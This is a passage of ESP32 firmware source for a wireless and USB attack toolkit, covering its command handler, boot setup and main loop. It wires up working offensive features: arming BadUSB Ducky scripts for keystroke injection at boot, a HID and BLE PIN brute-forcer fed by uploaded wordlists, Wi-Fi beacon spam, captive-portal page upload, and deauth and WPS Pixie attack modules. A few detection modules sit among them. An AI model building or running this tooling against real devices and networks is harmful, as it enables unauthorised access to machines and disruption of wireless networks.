            if (!MassStorage::setup()) {
                proto.sendResp(id, false, "failed to enter MSC mode");
            } else {
                proto.sendResp(id, true, "msc mode active");
            }
        #else
            proto.sendResp(id, false, "storage not supported on this chip");
        #endif
    }

    // File upload to mass storage
    else if (strcmp(cmd, "SET_FILE_CHUNK") == 0) {
        #if MSC_SUPPORTED
            const char* filename = doc["args"]["filename"] | (const char*)nullptr;
            const char* b64data  = doc["args"]["data"]     | (const char*)nullptr;
            bool last            = doc["args"]["last"]     | false;

            if (!filename || !b64data) {
                proto.sendResp(id, false, "missing filename or data");
                return;
            }

            size_t b64len = strlen(b64data);
            size_t outCap = ((b64len + 3) / 4) * 3 + 2;

            uint8_t* outBuf = (uint8_t*)heap_caps_malloc(outCap, MALLOC_CAP_8BIT);
            if (!outBuf) {
                proto.sendResp(id, false, "oom");
                return;
            }

            size_t outLen = 0;
            int ret = mbedtls_base64_decode(outBuf, outCap, &outLen,
                                            (const unsigned char*)b64data, b64len);
            if (ret == 0) {
                bool ok = FileUpload::addChunk(filename, outBuf, outLen, last);
                if (last) {
                    proto.sendResp(id, ok, ok ? "file written" : "write failed or rejected extension");
                } else {
                    proto.sendResp(id, ok, ok ? "chunk ok" : "rejected (bad extension?)");
                }
            } else {
                proto.sendResp(id, false, "decode failed");
            }

            heap_caps_free(outBuf);
        #else
            proto.sendResp(id, false, "storage not supported on this chip");
        #endif
    }

    else if (strcmp(cmd, "START_BADUSB") == 0) {
        #if HID_SUPPORTED
            // Native HID boot actions are mutually exclusive. Arming BadUSB
            // disarms any waiting PIN session without touching HID state.
            pinBruteforce.disarm();
            const char* filename = doc["args"]["filename"] | (const char*)nullptr;
            bool        startMSC = doc["args"]["msc"] | false;
            if (!filename) { proto.sendResp(id, false, "Ducky script is missing!"); return; }
            bool ok = UsbHID::armScript(filename, startMSC);
            proto.sendResp(id, ok, ok ? "Armed successfully" : "failed to arm");
            #if defined(CONFIG_IDF_TARGET_ESP32S2)
            digitalWrite(LED_PIN, HIGH);
            #endif
        #else
            proto.sendResp(id, false, "HID not supported on this chip");
        #endif
    }

    // ── PIN BRUTEFORCE ───────────────────────────────────────────────────
    else if (strcmp(cmd, "PIN_RANGE_START") == 0) {
        #if HID_SUPPORTED
            // Native HID boot actions are mutually exclusive. Arming PIN
            // disarms any waiting BadUSB script.
            UsbHID::disarm();
        #endif
        String error;
        if (!pinBruteforce.start(doc["args"], error)) {
            proto.sendResp(id, false, error.c_str());
            return;
        }
        JsonDocument resp;
        resp["ok"] = true;
        pinBruteforce.status(resp);
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "PIN_RANGE_STOP") == 0) {
        pinBruteforce.stop();
        JsonDocument resp;
        resp["ok"] = true;
        pinBruteforce.status(resp);
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "PIN_RANGE_CLEAR") == 0) {
        bool clearWordlist = doc["args"]["wordlist"] | false;
        String error;
        pinBruteforce.clear(clearWordlist, error);
        JsonDocument resp;
        resp["ok"] = true;
        pinBruteforce.status(resp);
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "PIN_RANGE_STATUS") == 0) {
        JsonDocument resp;
        resp["ok"] = true;
        pinBruteforce.status(resp);
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "PIN_WORDLIST_RESET") == 0) {
        String error;
        bool ok = pinBruteforce.beginWordlistUpload(error);
        proto.sendResp(id, ok, ok ? "wordlist upload ready" : error.c_str());
    }

    else if (strcmp(cmd, "PIN_WORDLIST_CHUNK") == 0) {
        const char* b64data = doc["args"]["data"] | (const char*)nullptr;
        bool last = doc["args"]["last"] | false;
        uint32_t offset = doc["args"]["offset"] | 0;
        uint32_t checksum = doc["args"]["checksum"] | 0;
        if (!b64data) {
            proto.sendResp(id, false, "missing data");
            return;
        }
        size_t b64len = strlen(b64data);
        size_t outCap = ((b64len + 3) / 4) * 3 + 2;
        uint8_t* outBuf = (uint8_t*)heap_caps_malloc(outCap, MALLOC_CAP_8BIT);
        if (!outBuf) {
            proto.sendResp(id, false, "oom");
            return;
        }
        size_t outLen = 0;
        int ret = mbedtls_base64_decode(outBuf, outCap, &outLen,
                                        (const unsigned char*)b64data, b64len);
        String error;
        bool ok = false;
        if (ret == 0) {
            ok = pinBruteforce.addWordlistChunk(outBuf, outLen, offset, checksum, last, error);
        } else {
            error = "decode failed";
        }
        heap_caps_free(outBuf);
        proto.sendResp(id, ok, ok ? (last ? "wordlist saved" : "chunk ok") : error.c_str());
    }

    // ── BEACON SPAM ───────────────────────────────────────────────────────
    else if (strcmp(cmd, "START_BEACON") == 0) {
        radioIdle();  // stop sniff / portal / prior beacon before starting

        const char* band = doc["args"]["band"] | "auto";
        WifiBandMode bandMode = WifiBandMode::BAND_2G;
        String bandError;
        if (!configureWifiBand(band, bandMode, bandError)) {
            proto.sendResp(id, false, bandError.c_str());
            return;
        }

        const char* ssidsRaw = doc["args"]["ssids"] | "";
        uint8_t  channel     = doc["args"]["channel"] | 1;
        if (!isValidWifiChannel(channel)) {
            proto.sendResp(id, false, "invalid channel");
            return;
        }
        String regulatoryError;
        if (!validateRegulatoryChannel(channel, regulatoryError)) {
            proto.sendResp(id, false, regulatoryError.c_str());
            return;
        }
        uint16_t intervalMs  = doc["args"]["interval_ms"] | 20;
        bool randomize       = doc["args"]["random_bssid"] | true;
        bool hidden          = doc["args"]["hidden"] | false;

        if (ssidsRaw[0] == '\0') {
            proto.sendResp(id, false, "missing ssids");
        } else if (!beacon.start(String(ssidsRaw), channel, intervalMs, randomize, hidden)) {
            proto.sendResp(id, false, "invalid channel or empty ssid list");
        } else {
            BeaconStats bs = beacon.stats();
            JsonDocument resp;
            resp["ok"]      = true;
            resp["ssids"]   = bs.ssids;
            resp["channel"] = bs.channel;
            String json; serializeJson(resp, json);
            proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
        }
    }

    else if (strcmp(cmd, "STOP_BEACON") == 0) {
        BeaconStats bs = beacon.stats();
        beacon.stop();
        JsonDocument resp;
        resp["ok"]   = true;
        resp["sent"] = bs.sent;
        resp["ssids"] = bs.ssids;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else if (strcmp(cmd, "BEACON_STATUS") == 0) {
        BeaconStats bs = beacon.stats();
        JsonDocument resp;
        resp["ok"]      = true;
        resp["active"]  = beacon.active();
        resp["ssids"]   = bs.ssids;
        resp["sent"]    = bs.sent;
        resp["channel"] = bs.channel;
        String json; serializeJson(resp, json);
        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
    }

    else {
        proto.sendResp(id, false, "unknown command");
    }
}

void handleAck(uint32_t chunk_index) {
    sniffer.onAck(chunk_index);
}

static bool shouldLogMemoryCommand(const char* cmd) {
    if (!cmd || cmd[0] == '\0') return false;
    return strcmp(cmd, "SCAN_WIFI") == 0 ||
           strcmp(cmd, "DEAUTH") == 0 ||
           strcmp(cmd, "DEAUTH_BURST") == 0 ||
           strcmp(cmd, "WPS_PIXIE_ATTEMPT") == 0 ||
           strstr(cmd, "START") != nullptr ||
           strstr(cmd, "STOP") != nullptr;
}

static void handleCmdWithMemoryLog(uint8_t id, JsonDocument& doc) {
    const char* cmd = doc["cmd"] | "";
    if (!shouldLogMemoryCommand(cmd)) {
        handleCmdImpl(id, doc);
        return;
    }

    const uint32_t startedMs = millis();
    const uint32_t freeBefore = ESP.getFreeHeap();
    handleCmdImpl(id, doc);
    const uint32_t endedMs = millis();

    // Keep diagnostics out of the UART protocol stream. On UART-only builds
    // Serial is the protocol transport, so a raw printf would corrupt frames.
    JsonDocument mem;
    mem["cmd"] = cmd[0] ? cmd : "unknown";
    mem["start_ms"] = startedMs;
    mem["end_ms"] = endedMs;
    mem["duration_ms"] = endedMs - startedMs;
    mem["free_before"] = freeBefore;
    mem["free_after"] = ESP.getFreeHeap();
    mem["min_free"] = ESP.getMinFreeHeap();
    mem["largest"] = ESP.getMaxAllocHeap();
    mem["psram_total"] = ESP.getPsramSize();
    mem["psram_free"] = ESP.getFreePsram();
    mem["transport"] = proto.activeTransportName();
    proto.sendEvent("mem", mem);
}

void sendHeartbeat() {
    static uint32_t last = 0;
    if (millis() - last < 5000) return;
    last = millis();

    // Keep the heartbeat independent of ArduinoJson dynamic allocation. On S2
    // the JSON document path has been observed producing an empty object,
    // while the protocol frame itself remained valid. A fixed stack buffer
    // guarantees the monitor always receives a readable heartbeat payload.
    char payload[128];
    const int length = std::snprintf(
        payload,
        sizeof(payload),
        "{\"uptime\":%lu,\"heap\":%lu,\"type\":\"heartbeat\",\"transport\":\"%s\"}",
        static_cast<unsigned long>(millis()),
        static_cast<unsigned long>(ESP.getFreeHeap()),
        proto.activeTransportName());
    if (length <= 0) return;
    const size_t payloadLength = std::min<size_t>(
        static_cast<size_t>(length),
        sizeof(payload) - 1);
    proto.sendRaw(
        TYPE_EVENT,
        0,
        reinterpret_cast<const uint8_t*>(payload),
        static_cast<uint32_t>(payloadLength));
}

// ── Setup ──────────────────────────────────────────────────────────────────
void setup() {
    #if CONFIG_IDF_TARGET_ESP32S2 || CONFIG_IDF_TARGET_ESP32S3
        Keyboard.begin();
        Preferences prefs;
        prefs.begin("boot", false);
        bool mscMode = prefs.getBool("msc_mode", false);

        if (mscMode) prefs.putBool("msc_mode", false);


        prefs.end();

        #if (MSC_SUPPORTED || HID_SUPPORTED)
        if (mscMode) {
            MassStorage::setup();   // USB.begin() called fresh, nothing else has touched USB yet
            while (true) delay(1000);
        } else if (UsbHID::runIfArmed()) {
            // BadUSB keeps priority for the native HID boot path.
            while (true) delay(1500);
        } else if (pinBruteforce.runIfArmed()) {
            // One-shot HID session, like BadUSB. Keep the device in HID mode
            // until the user unplugs/replugs it, then re-arm from the app.
            while (true) delay(1500);
        }
        #endif
    #endif

#if NRSUITE_HAS_NATIVE_USB
    // Native USB CDC/JTAG is the primary protocol transport.
    Serial.begin(115200);
    // UART0 is the second protocol transport for devkits that expose a
    // USB-to-UART bridge alongside the native USB port.
    Serial0.setRxBufferSize(4096);
    Serial0.begin(115200);
    proto.addTransport(Serial0, "uart0");
#else
    Serial.setRxBufferSize(4096);
    Serial.begin(115200);
#endif
    delay(150);

    loadLd2450Config();

    #if LD2450_BOOT_START
        // Devkit bring-up: UART2 defaults for classic ESP32 devkit.
        String pinError;
        if (validateLd2450Pins(ld2450RxGpio, ld2450TxGpio, pinError)) {
            ld2450.begin(Serial1, LD2450_BAUD, ld2450RxGpio, ld2450TxGpio,
                         LD2450_BOOT_DEBUG);
        }
    #endif

    #if defined(CONFIG_IDF_TARGET_ESP32S2)
        pinMode(LED_PIN, OUTPUT);
    #endif

    // ── ONE-TIME radio init: APSTA and nothing else ever again ──────────────
    // ★ FIXED: removed the redundant first AP config block.
    // The one and only WiFi.mode() call is right here.
    WiFi.mode(WIFI_MODE_APSTA);
    applyStoredWifiCountry();

    // Configure a hidden, protected AP so WIFI_IF_AP is always valid for TX
    // without exposing the Arduino default open ESP_XXXXXX SoftAP.
    {
        char idleSsid[24]{};
        char idlePass[9]{};
        static const char kIdleChars[] =
            "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";
        const uint32_t seed = esp_random();
        snprintf(idleSsid, sizeof(idleSsid), "NRSuite-Idle-%06x", seed & 0xffffff);
        for (size_t i = 0; i < 8; ++i) {
            idlePass[i] = kIdleChars[(seed >> ((i % 4) * 8)) % (sizeof(kIdleChars) - 1)];
        }
        idlePass[8] = '\0';
        WiFi.softAP(idleSsid, idlePass, 1, 1, 1);
    }

    // Ensure promiscuous is OFF at boot
    esp_wifi_set_promiscuous(false);

    // Initialise subsystems
    proto.begin();
    proto.onCmd(handleCmdWithMemoryLog);
    proto.onAck(handleAck);

    #if NRSUITE_ENABLE_PORTAL
    proto.onHtml([](const uint8_t* data, size_t len) {
        if (len < 3) return;  // need at least seq(2) + isLast(1)

        uint16_t seq;
        memcpy(&seq, data, 2);
        bool isLast = data[2] != 0;
        const uint8_t* payload = data + 3;
        size_t payloadLen = len - 3;

        if (g_lastHtmlSeq != 0xFFFF && seq <= g_lastHtmlSeq) {
            // old or duplicate chunk — already applied, just re-ACK, don't reapply
        } else {
            portal.setHtmlChunk(payload, payloadLen, isLast);
            g_lastHtmlSeq = seq;
        }

        JsonDocument doc;
        doc["ok"]  = true;
        doc["seq"] = seq;
        String json;
        serializeJson(doc, json);
        proto.sendRaw(TYPE_RESP, 0, (const uint8_t*)json.c_str(), json.length());
    });
    #endif


    sniffer.begin(proto);
    #if NRSUITE_ENABLE_PORTAL
    portal.begin(proto);
    #endif
    beacon.begin(proto);
    deauthDetector.begin(proto);
    hiddenApDetector.begin(proto);
    mesh.begin(proto, getDeviceId().c_str(), CHIP_NAME);
    pinBruteforce.begin(proto);
    irRemote.begin(proto);
    pn532Nfc.begin(proto);
    wpsPixie.begin(proto);
    wpsLockDetector.begin(proto);
    wpsAttemptDetector.begin(proto);
    #ifdef ENABLE_BLE_HID
        bleScanner.begin(proto);
        bleProfile.begin(proto);
        blePinBruteforce.begin(proto);
        #ifdef NRSUITE_BLE_HEAP_DIAGNOSTIC
        BleHid::setPairingCompleteDiagnosticCallback([](bool success) {
            sendBleHeapDiagnostic(success
                ? "ble_pairing_complete"
                : "ble_pairing_failed");
        });
        #endif
    #endif

}

// ── Loop ───────────────────────────────────────────────────────────────────
void loop() {
    proto.update();
    sendHeartbeat();
    
    sniffer.processQueue();
    sniffer.handleHop();
    #if NRSUITE_ENABLE_PORTAL
    portal.update();
    #endif
    beacon.update();
    deauthDetector.update();
    hiddenApDetector.update();
    mesh.update();
    pinBruteforce.update();
    #ifdef ENABLE_BLE_HID
        blePinBruteforce.update();
    #endif
    ld2450.update();
    emitLd2450Events();
    irRemote.update();
    pn532Nfc.update();
    wpsPixie.update();
    wpsAttemptDetector.update();
    #ifdef ENABLE_BLE_HID
        bleScanner.update();
        bleProfile.update();
    #endif

    static uint32_t lastRefresh = 0;
    if (millis() - lastRefresh > 2500) {
        lastRefresh = millis();
        if (sniffer.active()) {
            // 
        }
    }
}